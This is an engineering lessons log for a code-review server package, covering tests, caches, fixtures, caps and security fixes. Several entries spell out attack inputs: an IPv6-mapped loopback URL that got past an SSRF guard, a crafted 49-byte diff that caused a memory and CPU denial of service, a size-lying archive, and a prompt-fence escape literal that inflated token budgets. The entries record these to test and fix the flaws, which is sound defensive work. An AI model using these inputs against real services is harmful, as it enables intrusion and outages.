# Insights — server/

Failures and surprises specific to this package. Repo-wide ones live in the root
`INSIGHTS.md`. Seven fixed sections, append-only —
`../.claude/skills/engineering-insights/SKILL.md` holds the rules.

---

## What Works

### Prove a bound by measuring it, before building a cache for it

A round-2 review called `buildConflicts` an "uncached O(n²) pair scan" run on every read of a
multi-run and asked for a cache keyed on the multi-run id. `SPEC-05 § Non-functional
requirements` states the bound instead — 10 agents × 50 findings grouped in **250 ms** — so the
cheaper answer was to write the input the bound names and time it: **1.9 ms** with all 500
findings in ONE file, the worst shape the quadratic term can take (2026-08-27,
`test/multi-agent-response-bounds.test.ts`). A cache would have added an invalidation problem to
a function that is 130× inside its budget, and `AC-97` says the section is never stored.

The test asserts the spec's 250 ms rather than a tight number measured on this machine: it is a
ceiling, not a benchmark, and a margin tuned to one laptop turns a real regression into a flaky
failure.

### Size a derivation change on real inputs with `tsx`, without paying for the endpoint that produces them

A pure transform under `modules/*/helpers.ts` can be run over production-shaped input in one
command, and on 2026-08-17 that is what turned "expect the count to drop" into "105 → 53":

```sh
curl -s localhost:3001/pulls/<id>/blast -o /tmp/blast.json     # the real indexed answer
cd server && pnpm exec tsx /tmp/derive.ts                      # imports the real helpers
```

`tsx` resolves the tsconfig `paths` from the CWD, so a scratch script outside the repo can import
`/…/server/src/modules/brief/helpers.js` and `@devdigest/shared` resolves inside it. Two reasons this
beats the obvious alternatives: `POST /pulls/:id/brief`, the real entry point, spends a live model
call for a derivation the model plays no part in, and both stored briefs on this machine have
`index_matches_head = false`, which gates `ref_lines` to `[]` before the rule under test is reached.
Re-running the same script with the old rule restored for one minute gives the before/after from the
same code path rather than from a reimplementation of it — a Python model of the same rule agreed to
the number, which is how the model was known to be trustworthy in the first place.

### A test for "the cap counts matches" is not proved by the red run that motivated it

Writing `test/git-list-files.test.ts` before `listFiles` learned `names` made seven of its cases
fail on 2026-08-17, which proves nothing about ordering: they failed because the result was empty.
The property that `maxFiles` slices **after** the filter was pinned separately, by mutating
`walkDocs` to stop after 12 files *visited* and re-running — both cases in the "maxFiles counts
matches" block went red, including the by-extension control. Two turns, and the mutation was
reverted in the same session. When a test exists to fix the order of two operations, the only red
run that means anything is the one where they are swapped.

### When the mock refuses to model a rule, assert the QUESTION the module asked

`plans/12` step P3.4 asked for a mock-backed case proving "nothing under `node_modules/` appears"
in the package scan, and it is unwritable as stated: `MockGitClient.listFiles` does not model
`EXCLUDED_WALK_DIRS` (recorded under *Codebase Patterns*), and its docstring forbids the fix that
suggests itself — a second exclusion list in the module. Deleting the case loses a real criterion
(AC-93); faking it loses the criterion **and** creates the duplicate.

The way out on 2026-08-17 was to split the claim by owner. The exclusion is the port's, and it is
proved once against `SimpleGitClient` over a temp clone (`test/git-list-files.test.ts`, "leaves out
a manifest under an excluded directory"). What the MODULE owns is the options it passes, so
`test/onboarding-gather.test.ts` records every `listFiles` call through a `RecordingGit extends
MockGitClient` and asserts `names: ['package.json']`, `extensions: []`, `maxDepth`, and
`maxFiles === PACKAGE_SCAN_LIMIT` with `PACKAGE_SCAN_LIMIT > MAX_PACKAGES`. That is not a weaker
test of the same thing — it catches the failure the port cannot: a walk asked by extension, or
asked for exactly the ceiling, excludes nothing however well the adapter behaves. Both mutations
were run and both went red.

Generally: a mock-backed test asserting a port's own behaviour is a test of the mock. Assert the
call, and prove the behaviour once against the real adapter.

### A supply requirement stated as a COUNT has to be measured before the constant is raised

`getCriticalPaths` seeds a chain from a file and walks importer → imported, but `file_rank`
rewards being *imported*: the best-ranked file in a repository is typically a leaf everyone
depends on and imports nothing. Measured 2026-08-18 against the live index of
`Holubinka/dev-digest` (656 ranked files, 1113 edges, 460 files with any out-edge), three rules
over the same `getEdges` + `getRankedPaths(repoId, 100_000)` data:

| Rule | Chains ≥2 files | Longest | Roots skipped for no out-edge |
|---|---|---|---|
| (a) today: top 5 roots by rank, depth 2 | **2** | 3 | 3 of 5 |
| (b) the obvious raise: top 20 roots, depth 4 | **7** | 3 | 13 of 20 |
| (c) walk the rank list, skip rootless roots, stop at 20 chains, depth 4 | **20** | 5 | 26 of 46 tried |

So raising `CRITICAL_PATH_ROOTS` 5 → 20 buys 5 chains, not 15 — thirteen of the twenty best-ranked
files have no out-edge at all. The requirement was written as "at least 20 chains are supplied",
not as "20 roots", and that phrasing is what made the difference measurable instead of assumed.
The recipe is the `.mts` scratch script already recorded below: `createDb` + the repository, or
`new RepoIntelService({ config: { repoIntelEnabled: true }, db } as never)` to exercise the
shipped method itself — a facade read needs no route, no container wiring and no model call.

Generally: when an acceptance criterion names a delivered count, run the candidate rule over real
data before touching the constant. The two-number version of this change would have shipped
twenty rejected chains and no new ones.

## What Doesn't Work

### Testing a guard by calling its classifier directly can pass while the guard is wide open

Both security bugs `/pr-self-review` found on 2026-08-03 had this exact shape: a unit test
that fed the classifier an input the running system never produces.

`server/test/skill-fetch.test.ts` asserted `ipv6IsPublic('::ffff:127.0.0.1') === false`. But
`assertPublicHttps` never sees that string — `new URL('https://[::ffff:127.0.0.1]/')` re-spells
the hostname as `[::ffff:7f00:1]`, and the old dotted-quad regex did not match the hex form. So
the test passed while loopback, RFC1918 and `169.254.169.254` were all reachable through
`POST /skills/import/url` and through every redirect hop.

The same session's archive bug is the other half of the pattern: `parseSkillArchive`'s budget
was only ever exercised with archives built by `fflate.zipSync`, which always writes the
compressed and uncompressed sizes consistently. A hand-built archive where they disagree is the
only way to reach the branch that matters.

**The rule.** When a boundary normalises its input — `new URL()`, a decoder, a parser — drive
the test through the boundary with the raw literal a caller would send, not through the
classifier with the value you imagine it receives. Where the library is the thing that
normalises, build the hostile input by hand; a fixture built with the same library can only
produce inputs that library considers well-formed. Both fixes are pinned that way now:
`assertPublicHttps('https://[::ffff:127.0.0.1]/x')` and `storedArchiveLyingAboutSize()` in
`server/test/skills-import.test.ts`.

### A frozen dependency-cruiser edge silences that edge entirely, not one violation

`.dependency-cruiser-known-violations.json` freezes a *rule + from + to* triple, not a count.
`no-db-from-routes: src/modules/pulls/routes.ts → src/db/schema.ts` is one of the frozen 20, so
`pnpm arch` exits 0 no matter how many inline `container.db` queries that file grows. On
2026-08-02 this branch added a seventeenth and the gate still printed
`✔ no dependency violations found (20 known violations ignored)`.

`.github/workflows/server-arch.yml` compounds it: `--ignore-known` is the blocking step and the
strict run is `|| true`, so CI is blind to the same growth.

The consequence is the opposite of what a baseline is for. It is meant to make a backlog
countable while new violations fail; on a frozen edge it lets the backlog grow silently. Moving
one query out does not restore the gate for that file — it stays silenced until the last of them
leaves. `pulls/routes.ts` went 18 → 16 on 2026-08-02 and is still not measured.

When adding to a file that already appears in the frozen list, `pnpm arch:strict` is the only
command that tells the truth.

### The architecture gate ran on exactly one machine for five days

`server/.dependency-cruiser.cjs`, `.dependency-cruiser-known-violations.json` and
`.github/workflows/server-arch.yml` were all untracked until 2026-08-02, while `server/AGENTS.md`
and spec 02 described the gate as live. `pnpm arch` passed locally because the config sat on
disk; on any fresh clone `depcruise --config` would have failed with no configuration file, and
CI never ran the job at all. Committed in `006fda4`.

A gate whose config is untracked is indistinguishable from a passing gate. `git ls-files` on the
config is part of trusting the result.

### Adding `GROUP BY` to a list query throws away the order the UI was relying on

Caught while writing the query on 2026-08-06, not in production. `AgentsRepository.list` was a
plain `select().from(agents).where(...)` with no `ORDER BY`, and the Agents list looked stably
ordered only because Postgres happened to return physical row order. Aggregating
`countDistinct` for `skill_count` lets the planner hash-aggregate and emit the groups in any
order, so the cards would reshuffle for no visible reason.

State the order in the same commit that adds the aggregate:
`.orderBy(asc(t.agents.createdAt), asc(t.agents.name))`. `createdAt` alone is not enough —
`src/db/seed.ts` inserts several agents in one statement and `defaultNow()` gives them an
identical timestamp, so the tie-break is load-bearing.


### A `truncated` flag computed from an already-capped list is false by construction

**Symptom.** `blast`'s `caller_count` never exceeded 20 and `truncated` was never `true` on any
real PR, while a unit test asserting exactly that behaviour passed.
**Cause.** `plans/07-blast-radius.md` step 3 caps callers at `MAX_CALLERS_PER_SYMBOL` inside
`modules/repo-intel/service.ts`, and step 7 then asked `blast/helpers.ts` `toView` to report the
count *before* the cap. `toView` only ever receives the capped array, so `callers.length` is the
post-cap size by definition. The plan's own test passed only because it handed `toView` a
hand-built 21-element list — a shape no production path can produce.
**Fix.** The function that truncates is the last one that knows the original size, so it must
return both: `capCallersPerSymbol` returns `{ callers, counts }` and `BlastResult.callerCounts`
carries the pre-cap size per `viaSymbol`. Generalised, two rules. When a cap and the field
describing that cap live in different rings, the capping ring has to emit the count — the
consuming ring cannot recover it. And when a test for an "N of M" field constructs M itself,
check whether any real path can produce M before believing the green.

### A gate is only as strong as the method it reads, and two facade methods disagreed

**Symptom.** With `REPO_INTEL_ENABLED=false` and a previously-indexed repo,
`GET /pulls/:id/blast` ran `codeIndex.symbols`, `codeIndex.references` and `readClone`
synchronously inside the HTTP request — the AST work acceptance criterion 4 forbids — while
`blast/service.ts` sat there holding a gate written specifically to prevent it.

**Cause.** The gate reads `repoIntel.getIndexState(repoId).status` and refuses to call
`getBlastRadius` unless it is `full` or `partial`. But `getIndexState`
(`repo-intel/service.ts:191`) built its answer from the `repo_index_state` row alone and never
consulted `config.repoIntelEnabled`, while `getBlastRadius` (`:225`) did. So the flag turned
off the *persistent* path and left the *clone-reading fallback* on, and the gate — reading a
stale `full` — opened onto exactly the branch it exists to keep shut. Every unit test passed:
the blast suite fakes `repoIntel`, so a disagreement *between* two real facade methods is
invisible to it by construction.

**Fix.** `getIndexState` checks the flag first and returns `degradedIndexState(repoId,
'flag_off')`, the way `getRepoMap` already did per-method — which also makes the contract at
`platform/config.ts:60-64` true rather than nearly true. Two rules out of it. When one method
gates another, they must consult the *same* inputs, and a config flag consulted by only half a
facade is a bug waiting for the flag to be flipped. And when a slice fakes a collaborator
wholesale, at least one test must wire the REAL collaborator in
(`test/blast-service.test.ts` → "does not reach getBlastRadius when the flag is off"), because
the seam between two real methods is where a fake sees nothing.

### Summing a per-hunk property across the whole diff is not a guard — one honest file defeats it

**Symptom.** `POST /reviews/diff` accepted the 49-byte body
`diff --git a/x b/x\n+++ b/x\n@@ -1,1 +1,16000000 @@`. It parses to 1 file / 1 hunk with
`newLineNumbers: []`, so `buildLineIndex` (`reviewer-core/src/grounding.ts:31-34`) fell back to
the *declared* range and blocked the single-process event loop for **1345 ms while allocating
478 MB** — measured 2026-08-09 with `pnpm exec tsx`. A 20-digit count reaches
`RangeError: Set maximum size exceeded`. The route runs it once per agent, after each agent's
paid call, at 6 requests/minute.

**Cause.** `assertReviewable` counted *hunks*, and a hunk is only a header: `@@` declares a
new-side range, and the lines under it are what cover one.

**Fix.** Refuse a hunk with `newLineNumbers.length === 0 && newLines > 0` — and refuse it
**per hunk**, not by summing coverage across the diff. The obvious total-based check
(`sum(newLineNumbers) === 0 → 422`) is defeated by a 95-byte body that puts one real one-line
file in front of the crafted one: the total is 1, the guard passes, and the crafted hunk still
built a 16,000,000-entry Set in 1333 ms. Verified both ways before and after the fix; the
counter-example is `test/reviews-diff-guard.test.ts` → "refuses that hunk even when an honest
file precedes it". Note the fallback itself still exists in `reviewer-core` — the server refuses
the input, nothing bounds the loop, so any future caller of `buildLineIndex` inherits the same
liability.

### A state fallback written for the common row reports a lie for the first one

**Symptom.** `scanState()` in `modules/context/service.ts` escaped a stale `scanning_at` claim on
its first line, then fell back to `scannedAt ? 'scanned' : 'scanning'`. A repo whose FIRST scan
was stranded has no `scannedAt`, so it reported `scanning` forever — polling forever, with the
Rescan button disabled on that same state. The rescan case was covered by a test; the first-scan
case was not, because both tests set `scannedAt`.

**Cause.** The escape hatch and the fallback were written at different times against different
rows. Whenever a derived state has one branch per *known outcome* plus a catch-all, the catch-all
is where the row nobody pictured ends up.

**Fix.** State it as a rule and apply it in both places: a claim older than `SCAN_CLAIM_STALE_MS`
contributes nothing, so the fallback is `scannedAt ? 'scanned' : 'failed'` — an abandoned scan is
a failed scan, not a running one. And because `JobRunner` (`platform/jobs.ts`) is an in-memory
`PQueue` that recovers nothing on boot — an API restart under `tsx watch` produces this row
routinely — the read that finds a stale claim re-claims and re-enqueues. Re-claiming first is what
keeps that to one job per stale window rather than one per page load. Tests:
`test/context-service.test.ts` → "a FIRST scan whose claim went stale …" and "a LIVE claim is not
re-enqueued".

### A read cap on text that is handed to an editor is a silent delete, not a cap

**Symptom.** `docContent` (`modules/context/service.ts`) returned
`truncateCodePoints(text, MAX_DOC_CHARS)` and carried no flag saying it had cut anything.
`DocPanel.startEdit` seeded its draft from exactly that string and `PUT
/repos/:id/context/docs/content` wrote the draft as the WHOLE file. Measured against the running
app 2026-08-14: `docs/superpowers/plans/2026-08-01-pr-self-review.md` is 74 636 code points on
disk, was served as 40 000, and one Edit → Save deleted 34 636 of them. Reproduced hermetically —
disk 40 046 → 39 998, tail gone — before the fix landed.

**Cause.** One constant was doing two unrelated jobs. `MAX_DOC_CHARS` bounds what a *prompt* may
carry, which is a cost and a budget decision; the reading pane borrowed it because it was there.
A truncation is only safe on a path whose output nobody writes back.

**Fix.** Split the caps by what they protect. The scan and `readCandidate` still truncate at
`MAX_DOC_CHARS`; the reader does not truncate at all and reads `MAX_DOC_READ_BYTES`
(`MAX_DOC_FILE_BYTES + 1`) so that a body which came back over `MAX_DOC_FILE_BYTES` is provably a
prefix and answers `doc_refused` instead. `docContent` is now whole-or-nothing, which is what
makes the write cap sufficient on its own: a prefix is ≥ 102 400 code points and `persistWrite`
refuses anything over 40 000, so a partial body cannot be written back by any route. Tests:
`test/context-service.test.ts` → "serves a document past the editor cap WHOLE …" and
`test/context-write.test.ts` → "read → edit → save never deletes a tail …".

**Read it as a rule:** before capping a read, ask whether anything writes that string back. If it
does, the cap has to be a refusal or the write path has to reject what came out of it.

### A path gate that tests `segments[0]` is narrower than the sentence above it

The `.git` refusal existed in **three** places — `modules/_shared/repo-paths.ts`,
`adapters/git/simple-git.ts` `readFile`, and the same file's `writeTarget` — and all three tested
only the FIRST segment (`startsWith('.git/')`, `segments[0] === '.git'`). All three carried a
comment saying the git directory is refused because `config` holds the PAT and `hooks/pre-commit`
is code git executes. Neither claim was true of `docs/vendor/.git/`, and a clone can hold a nested
repository — a vendored dependency, a fixture, a stray `git init` — whose `.git` is exactly as real
as the root's. No symlink and no `..` were needed to reach it. Found by a DevDigest review of
PR #20 on 2026-08-16; fixed by testing every segment, case-folded (`.GIT` resolves to the same
directory on macOS). Tests: `test/git-read-containment.test.ts` → *"refuses a NESTED repository's
.git …"*, `test/git-write-containment.test.ts` → *"refuses a path into a NESTED repository's
.git"*, `test/context-helpers.test.ts` → *"refuses a nested repository's git directory, at any
depth"*.

**The part worth carrying:** `repo-paths.ts` was created days earlier *because* this gate was
duplicated and the copies had drifted — its own header says so. Consolidating the two module
copies left the two adapter copies untouched, and those were wrong in the same way. When you
extract a duplicated rule, grep for the rule's *shape* (`'.git'`, `segments[0]`), not for the
function you are replacing; the copies that matter are the ones that never called it.

### A fixture that spells two sources with the same string tests neither of them

**Symptom.** `test/brief-allowed-refs.test.ts` asserted that the allowed-refs set follows what the
prompt printed, and passed for six weeks over a `blastBlock` that seeded the set from
`view.changed_files` — a list it never prints. The fixture set `changed_files: ['src/changed.ts']`
and `symbols[0].file: 'src/changed.ts'`. Every assertion about `src/changed.ts` held whichever of
the two put it there, so no case could distinguish them and none could fail.

**Cause.** Realistic fixture values collapse. A path that plausibly appears in both a changed-file
list and a symbol record will be written once, and the moment it is, the test stops being about
which code path produced it.

**Fix.** Give each source a value only it can supply — `changed_files: ['src/changed.ts',
'src/unprinted.ts']` where no symbol names `src/unprinted.ts` — and then flip the code back to the
broken shape and watch the new case fail. On 2026-08-16 that turned a green file into a failing
one in one run. Same lesson as the `.git` entry above: the copies that matter are the ones nothing
was ever pointed at.

### Grounding by membership is not a bound on the answer

**Symptom.** `groundBrief` (`modules/brief/helpers.ts`) filtered every model-written reference
against the allowed set and shipped. Nothing capped the number of risks, the number of focus
items, the repeats of one allowed path inside `file_refs`, the length of `what`/`why`, or the
`dropped_refs` list — which is pure ungrounded model text. All of it goes to jsonb and out of
every GET, over an input a PR author controls.

**Cause.** A membership filter answers "was this name shown to the model", which reads like the
whole safety question and is only half of it. The other half is "how much of this may a row
carry", and the same allowed path repeated four hundred times passes the first test every time.

**Fix.** Cap after the parse, never in the schema — Anthropic rejects `maxItems`/`maximum`, see
the entry further down. The caps live in `modules/brief/constants.ts` under `output caps`
(`MAX_RISKS`, `MAX_REVIEW_FOCUS`, `MAX_RISK_FILE_REFS`, `MAX_DROPPED_REFS`, `MAX_PROSE_CHARS`),
next to the input caps, and `groundBrief` applies all of them. `ConventionsService.ground` slicing
to `MAX_CANDIDATES` is the same move. Note the ordering: the risk cap runs AFTER the severity
sort, so what it takes is the least severe, and the overflow is added to `dropped_risks` rather
than disappearing.

### An invariant maintained at the call site breaks once per call site

**Symptom.** "A block's `refs` are exactly what its text printed" broke three times in three
places on one feature, found by three different readers: refs built from the raw sources before
the budget walk cut anything; refs seeded from `view.changed_files`, which no block prints; and
`refs.add(...)` running before `clamp()` cut the line the name sat in. Each fix revealed the next
one down. Three point fixes, one week, and the doc comment above `blastBlock` asserted the
invariant held the whole time.

**Cause.** The rule was written down twice — as a paragraph of comment and as a diagnostic in
this file — and enforced nowhere. Every new call site had to re-derive it, and a comment claiming
the invariant reads exactly the same whether or not the code below it still keeps it.

**Fix.** Test the rule, not the sites. `test/brief-allowed-refs.test.ts` runs
`[...buildAllowedRefs(fit.included)].filter(r => !fit.user.includes(r))` over a deliberately
hostile view — every name longer than a rendered line, more changed files than `MAX_FILE_PATHS`,
a spec the walk truncated beside one it dropped, a non-`full` status — and a new call site cannot
be added without it. The signal that the fixture was the problem and not the coders: the four new
cases failed against the code as shipped, while the eight old ones passed through two of the
three holes. Cost of skipping this: rounds two and three of a review that was capped at two.

### A budget measured before an escape is not a budget

**Symptom.** `BRIEF_TOKEN_BUDGET` is 8000 and AC-18 counts the first assembled input against it
before the call. Measured 2026-08-16 with `TiktokenTokenizer` and the real 914-token
`risk-brief.system.md`: three linked spec files of `MAX_SPEC_FILE_CHARS` of the literal
`</untrusted>` count **4521 tokens** in the budget walk and ship as **6021**, assembling to
**9202 against 8000**. Both halves are attacker-controlled on a public repo — the `.md` is
repository content and the PR body is what `parsePlanRefs` scans to choose it.

**Cause.** `wrapUntrusted` rewrites `</untrusted>` to `<\/untrusted>` inside the content, which is
not length-preserving (+8.3% at worst, +19% in tokens on this input). Every fixed block is wrapped
inside `buildBlocks` and therefore measured after the rewrite; the specs were the one input handed
to `selectWithinBudget` raw and wrapped afterwards, and nothing re-measured. A second, smaller
leak of the same shape sat beside it: `selection.blocks.join('\n\n')` adds a blank line between
survivors that the walk never counted, worth +2 with three spec files.

**Fix.** Escape ONCE, per spec file, in `buildBlocks`, so the string the walk measures is the
string sent — `escapeUntrusted` is now exported from `reviewer-core/src/prompt.ts` (and re-exported
by `platform/prompt.ts`) precisely so a caller that measures can measure what ships. It is
idempotent, so the `wrapUntrusted` that adds the fence afterwards finds nothing left to rewrite;
`reviewer-core/test/prompt.test.ts` pins that over overlapping and nested attempts rather than
assuming it. The inner joins are reserved for every candidate, conservatively, before the walk.

**The rule the two leaks share, worth more than either.** Anything that TRANSFORMS text after the
count is part of the count: a fence, an escape, a separator. `test/brief-budget.test.ts` had no
fixture containing the fence literal, so the escape was a no-op in every case the suite exercised
and only the fixture stood between this and shipping.

### `stripNulDeep` over a whole values object silently empties every `Date` in it

**Symptom.** `pr_brief` needed the NUL strip its neighbours already had (found 2026-08-17 by
`/pr-self-review`, `major`). The one-line fix reads as `stripNulDeep(values)` — one call, every
string, nothing to forget. It typechecks, because the helper is `<T>(value: T): T`, and it
writes `{}` into `intent_computed_at`.

**Cause.** `db/text.ts:51-60` rebuilds any non-array object from `Object.entries(value)`, and a
`Date` has no own enumerable properties: `Object.fromEntries(Object.entries(new Date()))` is
`{}`, and `instanceof Date` is then false. `BriefValues` mixes model jsonb with
`intentComputedAt: Date | null`, so the generic signature promises a `BriefValues` back while
handing a `timestamptz` column an empty object. Nothing in `tsc` can see it; whether the driver
or Postgres rejects it depends on the column.

**Fix.** Sanitise field by field — `stripNul` for the `text` columns, `stripNulDeep` for the
`jsonb` ones — and leave everything else named in a comment with the reason it needs nothing
(`modules/brief/repository.ts:8-31`). `stripNulDeep` is safe only over a value that is already
JSON-shaped, which is exactly why `saveRunTrace` can pass it a whole `RunTrace` and a repository
holding column values cannot pass it a whole row.

### The NUL strip is a per-write-path obligation, and the fourth path missed it

`pr_brief` is the third table to receive model output and the first to be written without the
guard: `insertReview` (`modules/reviews/repository/review.repo.ts:39-40`), `insertFindings`
(`:60-69`) and `saveRunTrace` (`repository/run.repo.ts:186`) all carry it, `upsertBrief` did not,
and `review.repo.ts:34` was edited on the same branch that added `upsertBrief` — the rule was on
screen while the new table was left out of it.

`pnpm arch` cannot see this, `tsc` cannot see this, and the brief's own unit suite could not:
`test/brief-service.test.ts` fakes the repository, so the only place the constraint exists is
real Postgres. The check that works is one grep per new table that stores model output —
`grep -n 'stripNul' src/modules/<m>/repository.ts` — plus an `*.it.test.ts` case that inserts
`String.fromCharCode(0)` through the repository, both halves of any upsert included: the
`onConflictDoUpdate.set` object is a second, separate parameter list, and it is the one every
recomputation of an existing state goes through.

### Grouping by a nullable column collapses every unknown into one group, and a ranking rule then compares things that were never comparable

**Symptom.** `pickListReview` (`src/modules/pulls/helpers.ts`) was written on 2026-08-17 to give
the PR list the rule the PR page's banner already used: settle which commit the score speaks for,
then take the most blocking review *of that commit*. Eight unit tests passed, including one
written specifically to prove that a `request_changes` from an older commit cannot outrank an
`approve` on the current one. On live data the function still did exactly that.

**Cause.** `reviews.head_sha` was added late and nothing backfilled it, so almost every stored
review has none — 69 of PR #7's 69 in this workspace, spanning the whole branch. Grouping by
`head_sha` puts all of those in one group, because `null === null`. That group is not one state;
it is many unknown ones. Ranking inside it by verdict then surfaces a `request_changes` from three
weeks ago as the PR's current score. The guard test could not catch it: its fixtures had real
shas, so it exercised the branch where grouping works.

**Fix.** Rank by verdict only when the group is a KNOWN state, and take the newest when it is not
(`helpers.ts`, `const ranked = state ? byMostBlockingThenNewest : byNewestThenId`). More generally:
when a rule partitions rows by a nullable column, write the fixture where that column is null
before believing the rule, because that is the majority of the table and not the corner of it.

**How it was found, which is the transferable part.** One query, before touching the UI:
`select p.number, rv.head_sha, count(*) … group by p.number, rv.head_sha` printed the shape of the
data the rule would meet. The whole defect was visible in its first row. A `psql` count over the
real table is two minutes and it is not something a fixture can substitute for — the fixtures were
written from the schema, and the schema says `head_sha` is nullable without saying that it is
almost always null.

### `repo_index_state` is never stamped `failed`, and a comment promises that it is

`server/src/modules/repo-intel/pipeline/full.ts:64-70` states, in a doc comment on `runFullIndex`:
"Errors that abort the whole run still stamp a `status='failed'` row before re-throwing — the handler
is idempotent on retry." Nothing does. The only `status: 'failed'` written anywhere in the repository
is the **job** row at `server/src/platform/jobs.ts:91`.

The read side is intact and correct — `server/src/modules/repo-intel/repository.ts:218` maps
`'degraded' | 'failed'` onto `index_failed` — so the branch is live on read and dead on write. The
consequence is user-visible: an index that crashed mid-run is indistinguishable from one that never
started, and the only reachable degraded reason today is the persisted `no_clone`.

Found 2026-08-17 while planning `SPEC-03`, whose AC-83 needs three distinguishable refusal reasons
and can reach two. Fix is a `catch` in `runFullIndex` that stamps before re-throwing, planned as step
P1.9 of `plans/13-onboarding-tour-server-api.md`; the stamp must carry the previous facts forward
rather than zeroes, because `upsertIndexState` writes every column and zeroing `lastIndexedSha` would
break the sha that `server/src/modules/blast/service.ts:100-113` renders every line number against.

The lesson beyond the defect: **the comment is why it survived.** A comment asserting behaviour that
does not exist reads as verification to everyone downstream, and three features consumed this one.
When a status value matters, grep for its *writer*, not for the sentence that claims it.

### A command modelled as `{ script, command, why }` cannot express `cp` or `docker compose`

**Symptom.** The onboarding tour's "How to run" section comes out of the pipeline without a
database: for DevDigest it can emit `pnpm install` and `pnpm dev` and nothing that creates a
`.env` or starts Postgres, so nobody can bring the project up by following it. Every gate is
green — `pnpm arch`, both typechecks, the contract round-trip — because the shape is internally
consistent; it is only wrong against the screen it has to fill.

**Cause.** `OnboardingCommand.script` is a key of that package's `package.json`, and grounding
keeps a command only when the key exists (AC-23). That makes `<manager> run <script>` the only
expressible command. `cp .env.example .env` and `docker compose up -d postgres` have no manifest
key at all, so they were not "dropped" — they were never sayable. The mockup
`specs/assets/SPEC-03-onboarding-tour.png` draws both of them, and the contract silently decided
the screen could not.

**Fix.** A repo-level `OnboardingSetupCommand { command, why, source_path }` beside `packages`
(`vendor/shared/contracts/knowledge.ts`), where `source_path` is the file that AUTHORISES the
command — the `.env.example` a `cp` reads from, the `COMPOSE_FILES` entry a compose command acts
on — and grounding keeps it only when that file exists and, for compose, declares every service
named. The general lesson is the cheap check: **read the contract against the source material
before writing the code, one field per drawn element.** This was found on 2026-08-17 by
`plan-verifier` doing exactly that, after the plan itself had considered the case (its
Recommendation 1) and declined it, and after the implementation had passed its own gates.

### A status the reader handles is no evidence that anything writes it

**Symptom.** `modules/repo-intel/repository.ts:218` maps `'degraded' | 'failed'` onto a degraded
`IndexState`, and the docstring on `runFullIndex` (`pipeline/full.ts:64-70`) stated that an error
aborting the run "still stamp[s] a `status='failed'` row before re-throwing". Neither was true of
the writer: for the whole life of the module no code path wrote `status: 'failed'` to
`repo_index_state`, so a crashed index was indistinguishable from one that never ran. Fixed
2026-08-17 (plan 13, P1.9).

**Cause.** The branch was live on read and dead on write, and a comment asserting the write is
what let it stay that way — every downstream reader treated the docstring as the check. Nothing
can fail here: the reader's branch is simply never taken, so no test, typecheck or `pnpm arch`
has anything to report.

**Fix.** For any status value a reader special-cases, grep the writers before believing it is
reachable: `grep -rn "status: 'failed'" server/src` returned exactly one hit, and it was the
*job* row (`platform/jobs.ts:91`), a different table. Do this before building a feature that gates
on the value — plan 13's AC-83 had a refusal reason that could never fire.

### A length cap applied to a string that will be EXECUTED has to reject it, not truncate it

**Symptom.** Every free string in `modules/onboarding/helpers.ts` is cut to `MAX_LINE_CHARS` with
`truncateCodePoints`, which is right for a title, a note or a `why`. Applied to the same file's
`command` fields it is a defect with no visible symptom: `docker compose up -d postgres redis`
truncated at a character boundary is `docker compose up -d postgres red`, which is still a
syntactically valid line, is still shown with a copy control, and now names a service that does
not exist. Cutting `cp .env.example .env` mid-token gives `cp .env.example .en`, which happily
creates a file nobody expected.

**Cause.** A cap is a bound on storage, and truncation is the storage-shaped answer to it. It is
correct exactly while the string is prose — something a human reads and can see is cut. The moment
the string is an instruction the human will run, a truncation is not a shorter version of the
claim, it is a DIFFERENT claim that still executes. Nothing distinguishes the two in the type
system: both are `string`.

**Fix.** `withinCommandCap` rejects an over-long command and counts it as a dropped claim
(`modules/onboarding/helpers.ts`, applied to every setup command, install command and package
command). The general rule for this repo: prose gets `truncateCodePoints`, anything destined for a
shell or a URL gets a length TEST and a drop. When adding a cap, ask what the string is for before
choosing which one — the two look identical at the call site (2026-08-17, plan 12 P4).

### `repoIntel.getRepoMap(repoId, budget)` answers empty for every budget but 1500

**Symptom.** The onboarding generation's highest-priority input arrived as
`repo_map: missing` on the first real run against `Holubinka/dev-digest`, a repository whose
index state is `full` with 656 files. No error, no `degraded` flag anywhere the caller looked —
just an empty string, and a tour written from file samples and `README.md` alone.

**Cause.** `getRepoMap` is a CACHE READ, not a render (`modules/repo-intel/service.ts:437-454`).
The pipeline stores exactly one row per commit, at `DEFAULT_REPO_MAP_TOKEN_BUDGET = 1500`
(`repo-intel/constants.ts:61`, written from `pipeline/full.ts:240` and
`pipeline/incremental.ts:228`), and the lookup matches `(repoId, commitSha, tokenBudget)`
exactly. Any other number misses and returns `{ text: '', tokens: 0, degraded: true }`. The
facade's own docstring says so; the caller had picked 6000 as "a quarter of the token budget",
which is a reasonable number and an unreachable one.

**Fix.** Ask for `DEFAULT_REPO_MAP_TOKEN_BUDGET`, or nothing at all — the parameter defaults to
it. Measured 2026-08-17 on this repo at `lastIndexedSha 2f8b7e19`: budget 6000 → 0 chars,
budget 1500 → 6215 chars / 1497 tokens. The check is two lines of `tsx` against a real repo id,
and no unit test can see it: a stub facade returns whatever the test made it return.

**Correction, 2026-08-17 (fix round).** The last sentence is true only of tests that go THROUGH
the facade. A test that imports both constants and asserts equality sees the drift perfectly
well, needs no repo and no DB, and is now in place: `test/onboarding-gather.test.ts`, "the
repo-map budget is the pipeline’s number, not a preference". Against the old value it fails with
`expected 6000 to be 1500`. `REPO_MAP_TOKEN_BUDGET` is now 1500
(`modules/onboarding/constants.ts`). The reason this belongs in a test rather than in an import
is that `no-cross-module` forbids `modules/onboarding/**` naming `modules/repo-intel/**`, and
`pnpm arch` cruises `src` only (`"arch": "depcruise src …"`), so a file under `test/` is bound by
no such rule. Generalise it: any constant that has to EQUAL another module's constant — rather
than merely resemble it — gets a two-line equality test, the same move as "excluded_dirs is an
echo of the walk" in `test/onboarding-packages.test.ts`. The alternative, a comment saying "keep
these in sync", is what produced this entry.

### A set filled by two producers stays half-filled until a fixture crosses the ceiling

`OnboardingSources.knownPaths` is documented in three places as "every path a read OR THE WALK
returned" (`generation-types.ts:114`, `gather-executor.ts:78`, plan 12 step P3.2). Only the read
half was ever wired: `knownPaths.add` appeared once, in the private `read` helper. Nothing caught
it for a whole package — not typecheck, not `pnpm arch`, not the eleven cases in
`test/onboarding-gather.test.ts`, and not the two that assert `knownPaths` by exact contents.

The reason is worth remembering, because it generalises past this file. **Below the ceiling the
two producers are indistinguishable.** With ≤ `MAX_PACKAGES` (12) manifests, every path the walk
returned is also a path `describePackage` re-reads, so the read half alone produces exactly the
right set and every fixture agrees. The halves diverge only when `found > shown` — and the one
